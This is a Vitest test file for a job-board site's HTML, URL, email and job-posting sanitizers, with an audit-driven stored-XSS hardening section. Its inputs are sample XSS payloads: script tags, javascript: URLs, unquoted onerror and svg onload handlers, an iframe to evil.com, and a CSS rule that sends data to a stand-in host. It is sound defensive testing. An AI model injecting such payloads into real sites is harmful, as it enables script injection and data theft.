/**
 * Sanitization Tests
 */

import { describe, it, expect } from 'vitest';
import {
    escapeHtml,
    stripHtml,
    sanitizeUrl,
    sanitizeEmail,
    sanitizeText,
    sanitizeJobPosting,
} from '@/lib/sanitize';

describe('Sanitization Utilities', () => {
    describe('escapeHtml', () => {
        it('escapes HTML special characters', () => {
            expect(escapeHtml('<script>alert("xss")</script>')).toBe(
                '&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;'
            );
        });

        it('escapes ampersands', () => {
            expect(escapeHtml('Tom & Jerry')).toBe('Tom &amp; Jerry');
        });

        it('handles empty strings', () => {
            expect(escapeHtml('')).toBe('');
        });
    });

    describe('stripHtml', () => {
        it('removes HTML tags', () => {
            expect(stripHtml('<p>Hello <strong>world</strong></p>')).toBe('Hello world');
        });

        it('removes script tags and content', () => {
            expect(stripHtml('Hello<script>alert("xss")</script>World')).toBe('HelloWorld');
        });

        it('removes style tags and content', () => {
            expect(stripHtml('Hello<style>.bad{color:red}</style>World')).toBe('HelloWorld');
        });
    });

    describe('sanitizeUrl', () => {
        it('allows https URLs', () => {
            expect(sanitizeUrl('https://example.com')).toBe('https://example.com');
        });

        it('allows http URLs', () => {
            expect(sanitizeUrl('http://example.com')).toBe('http://example.com');
        });

        it('allows relative URLs', () => {
            expect(sanitizeUrl('/jobs/123')).toBe('/jobs/123');
        });

        it('blocks javascript: URLs', () => {
            expect(sanitizeUrl('javascript:alert(1)')).toBe('');
        });

        it('blocks data: URLs with HTML', () => {
            expect(sanitizeUrl('data:text/html,<script>alert(1)</script>')).toBe('');
        });

        it('trims whitespace', () => {
            expect(sanitizeUrl('  https://example.com  ')).toBe('https://example.com');
        });
    });

    describe('sanitizeEmail', () => {
        it('lowercases email', () => {
            expect(sanitizeEmail('TEST@EXAMPLE.COM')).toBe('test@example.com');
        });

        it('trims whitespace', () => {
            expect(sanitizeEmail('  test@example.com  ')).toBe('test@example.com');
        });

        it('limits length to 254 characters', () => {
            const longEmail = 'a'.repeat(300) + '@example.com';
            expect(sanitizeEmail(longEmail).length).toBe(254);
        });
    });

    describe('sanitizeText', () => {
        it('removes script tags', () => {
            expect(sanitizeText('Hello<script>alert(1)</script>World')).toBe('HelloWorld');
        });

        it('removes event handlers', () => {
            expect(sanitizeText('<div onclick="alert(1)">Click</div>')).toBe('<div>Click</div>');
        });

        it('removes javascript: URLs', () => {
            expect(sanitizeText('Click javascript:alert(1)')).toBe('Click alert(1)');
        });

        it('respects max length', () => {
            expect(sanitizeText('Hello World', 5)).toBe('Hello');
        });

        it('trims whitespace', () => {
            expect(sanitizeText('  Hello  ')).toBe('Hello');
        });
    });

    describe('sanitizeJobPosting', () => {
        it('sanitizes all job posting fields', () => {
            const input = {
                title: '<script>alert(1)</script>PMHNP Position',
                employer: 'Healthcare<script>bad</script> Inc',
                location: 'New York, NY',
                description: '<p>Great job</p>',
                applyLink: 'https://example.com/apply',
                contactEmail: 'TEST@COMPANY.COM',
            };

            const result = sanitizeJobPosting(input);

            expect(result.title).toBe('PMHNP Position');
            expect(result.employer).toBe('Healthcare Inc');
            expect(result.contactEmail).toBe('test@company.com');
            expect(result.applyLink).toBe('https://example.com/apply');
        });

        it('rejects javascript: apply links', () => {
            const input = {
                title: 'Position',
                employer: 'Company',
                location: 'NYC',
                description: 'Description',
                applyLink: 'javascript:alert(1)',
                contactEmail: 'test@example.com',
            };

            const result = sanitizeJobPosting(input);
            expect(result.applyLink).toBe('');
        });

        // Sec1 (audit 2026-05-31): job descriptions are stored HTML rendered via
        // dangerouslySetInnerHTML. The old write path used the regex-only
        // `sanitizeText`, which leaves <iframe>, unquoted on* handlers, <svg>,
        // and <style> intact — a stored-XSS surface protected only at render
        // time. The fix applies the DOM-based sanitizer at write time too.
        describe('stored-XSS hardening of description (write-time)', () => {
            const base = {
                title: 'PMHNP',
                employer: 'Clinic',
                location: 'NYC',
                applyLink: 'https://example.com/apply',
                contactEmail: 'a@b.com',
            };
            const desc = (description: string) =>
                sanitizeJobPosting({ ...base, description }).description;

            it('strips <iframe> from the description', () => {
                expect(desc('<p>Join us</p><iframe src="https://evil.com"></iframe>'))
                    .not.toMatch(/<iframe/i);
            });

            it('strips UNQUOTED inline event handlers (onerror)', () => {
                // The regex sanitizer only matched quoted handlers; this survived.
                expect(desc('<img src=x onerror=alert(1)>')).not.toMatch(/onerror/i);
            });

            it('strips <svg> with onload', () => {
                const out = desc('<svg onload=alert(1)></svg>');
                expect(out).not.toMatch(/<svg/i);
                expect(out).not.toMatch(/onload/i);
            });

            it('drops javascript: hrefs on anchors', () => {
                expect(desc('<a href="javascript:alert(1)">click</a>')).not.toMatch(/javascript:/i);
            });

            it('strips <style> blocks (CSS exfiltration)', () => {
                expect(desc('<style>*{background:url(https://evil/?c)}</style>hello'))
                    .not.toMatch(/<style/i);
            });

            it('preserves legitimate rich-text formatting', () => {
                const out = desc('<p>Great <strong>job</strong></p><ul><li>Flexible</li></ul>');
                expect(out).toMatch(/<strong>job<\/strong>/);
                expect(out).toMatch(/<li>Flexible<\/li>/);
            });
        });
    });
});
